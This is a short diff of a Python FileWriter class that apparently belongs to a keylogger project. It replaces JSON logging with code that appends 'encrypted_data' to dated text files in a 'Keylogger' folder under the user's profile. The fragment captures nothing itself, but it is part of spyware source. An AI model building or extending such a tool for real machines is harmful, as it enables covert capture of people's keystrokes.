@@ -1,26 +1,17 @@
 import os
-import json
+from datetime import datetime
 
 
 class FileWriter:
 
-    def __init__(self, data):
-        self.data = data
-        self.writing()
-
-    def writing(self):       
-        file_name = os.path.join(f'log_data {self.data.pop()} .json')
-        
-        try:
-           with open(file_name, "r") as f:
-              data = json.load(f)
-
-        except FileNotFoundError:
-           data = {}
-
-        key = str(self.data.pop())
-        value = self.data
-        data[key] = value
-
-        with open(file_name, "w") as f:
-            json.dump(data, f, indent=2)
+    def __init__(self,encrypted_data):
+        self.encrypted_data = encrypted_data
+    
+    def writing(self):
+        folder_path = os.path.join(os.environ["USERPROFILE"], "Keylogger", "engin", "data_folder")
+        current_date = datetime.now().strftime("%Y-%m-%d")
+        file_path = os.path.join(folder_path, current_date+".txt")
+        if not os.path.exists(folder_path):
+            os.makedirs(folder_path)
+        with open(file_path, "a") as txt_file:
+            txt_file.write("".join(self.encrypted_data+"\n"))
